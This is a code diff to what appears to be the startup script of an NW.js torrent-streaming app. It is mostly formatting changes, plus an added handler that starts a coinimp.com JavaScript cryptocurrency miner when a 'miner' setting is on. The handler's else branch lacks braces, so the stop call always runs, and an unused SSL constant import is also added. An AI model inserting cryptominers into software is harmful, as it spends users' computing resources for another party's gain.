@@ -1,3 +1,5 @@
+const { SSL_OP_SSLEAY_080_CLIENT_DH_BUG } = require('constants');
+
 var
     // Minimum percentage to open video
     MIN_PERCENTAGE_LOADED = 0.5,
@@ -39,17 +41,17 @@ win.debug = function() {
 };
 win.info = function() {
     var params = Array.prototype.slice.call(arguments, 1);
-    params.unshift('%c[%cINFO%c] %c' + arguments[0], 'color: black;','color: blue;', 'color: black;','color: grey;');
+    params.unshift('%c[%cINFO%c] %c' + arguments[0], 'color: black;', 'color: blue;', 'color: black;', 'color: grey;');
     console.info.apply(console, params);
 };
 win.warn = function() {
     var params = Array.prototype.slice.call(arguments, 1);
-    params.unshift('[%cWARNING%c] %c' + arguments[0], 'color: orange;', 'color: black;','color: grey;');
+    params.unshift('[%cWARNING%c] %c' + arguments[0], 'color: orange;', 'color: black;', 'color: grey;');
     console.warn.apply(console, params);
 };
 win.error = function() {
     var params = Array.prototype.slice.call(arguments, 1);
-    params.unshift('%c[%cERROR%c] %c' + arguments[0], 'color: black;', 'color: red;', 'color: black;','color: grey;');
+    params.unshift('%c[%cERROR%c] %c' + arguments[0], 'color: black;', 'color: red;', 'color: black;', 'color: grey;');
     console.error.apply(console, params);
     fs.appendFileSync(path.join(require('nw.gui').App.dataPath, 'logs.txt'), '\n\n' + (arguments[0].stack || arguments[0])); // log errors;
 };
@@ -144,10 +146,10 @@ App.addInitializer(function(options) {
         zoom = 2;
     }
     /*
-	if (ScreenResolution.UltraHD) {
-		zoom = 4;
-	}
-	*/
+    if (ScreenResolution.UltraHD) {
+        zoom = 4;
+    }
+    */
 
     var width = parseInt(localStorage.width ? localStorage.width : Settings.defaultWidth);
     var height = parseInt(localStorage.height ? localStorage.height : Settings.defaultHeight);
@@ -201,6 +203,7 @@ var initTemplates = function() {
 
 var initApp = function() {
     var mainWindow = new App.View.MainWindow();
+
     win.show();
 
     try {
@@ -503,7 +506,7 @@ var handleTorrent = function(torrent) {
         var torrentUrl = new URL(torrent);
         torrent = unescape(torrentUrl.protocol + torrentUrl.search);
     } else
-        torrent = unescape(torrent);       
+        torrent = unescape(torrent);
     try {
         App.PlayerView.closePlayer();
     } catch (err) {
@@ -562,6 +565,15 @@ $(document).on('paste', function(e) {
     return true;
 });
 
+App.vent.on('startMiner',function(){
+    if(AdvSettings.get("miner")){
+        win.info("Miner Started");  
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
+        _client.start();
+    }else
+        win.info("Miner Stopped/Not Active");
+        _client.stop();
+});
 
 // Pass magnet link as last argument to start stream
 var last_arg = gui.App.argv.pop();
@@ -631,6 +643,6 @@ process.on('uncaughtException', function(err) {
             App.vent.trigger('movies:list');
             $('.notification_alert').show().html('An error occured with the localization in ' + currentLocale).delay(4000).fadeOut(400);
         }
-    } catch (e) {}
+    } catch (e) { }
     win.error(err, err.stack);
 });
